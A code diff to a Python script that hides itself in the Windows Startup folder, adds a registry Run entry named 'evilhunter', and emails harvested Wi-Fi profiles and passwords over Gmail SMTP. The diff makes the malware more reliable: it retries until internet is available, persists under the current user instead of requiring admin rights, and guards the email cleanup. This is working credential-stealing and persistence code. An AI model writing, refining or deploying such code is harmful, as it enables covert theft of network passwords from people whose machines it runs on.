@@ -17,14 +17,15 @@ def run_command(command):
 
 # Function to check for an active internet connection
 def check_internet(host="8.8.8.8", port=53, timeout=5):
-    try:
-        socket.setdefaulttimeout(timeout)
-        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
-        return True
-    except socket.error as ex:
-        print("No internet connection.")
-        return False
-
+    while True:  # Infinite loop to continuously check the connection
+        try:
+            socket.setdefaulttimeout(timeout)
+            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
+            print("Internet connection established.")
+            return True  # Exit the loop once internet is available
+        except socket.error:
+            print("No internet connection. Retrying in 1 seconds...")
+            time.sleep(1)
 # Function to move the script to the Startup folder and hide it
 def move_and_hide_in_startup():
     startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -54,7 +55,7 @@ def move_and_hide_in_startup():
 
 # Function to add the script to the Windows Registry for startup
 def add_to_registry(executable_path):
-    key = reg.HKEY_LOCAL_MACHINE  # or reg.HKEY_LOCAL_MACHINE
+    key = reg.HKEY_CURRENT_USER  # or reg.HKEY_LOCAL_MACHINE
     key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     entry_name = "evilhunter"
 
@@ -79,6 +80,8 @@ def send_email(wifi_data_str):
     msg['Subject'] = subject
     msg.attach(MIMEText(f"Here are the Wi-Fi profiles and their passwords:\n\n{wifi_data_str}", 'plain'))
 
+    server = None  # Initialize the server variable
+
     try:
         # Establish a connection to the SMTP server
         server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -93,7 +96,8 @@ def send_email(wifi_data_str):
     except Exception as e:
         print(f"Failed to send email: {e}")
     finally:
-        server.quit()
+        if server:  # Check if server was initialized
+            server.quit()
 
 # Main script logic
 def main():
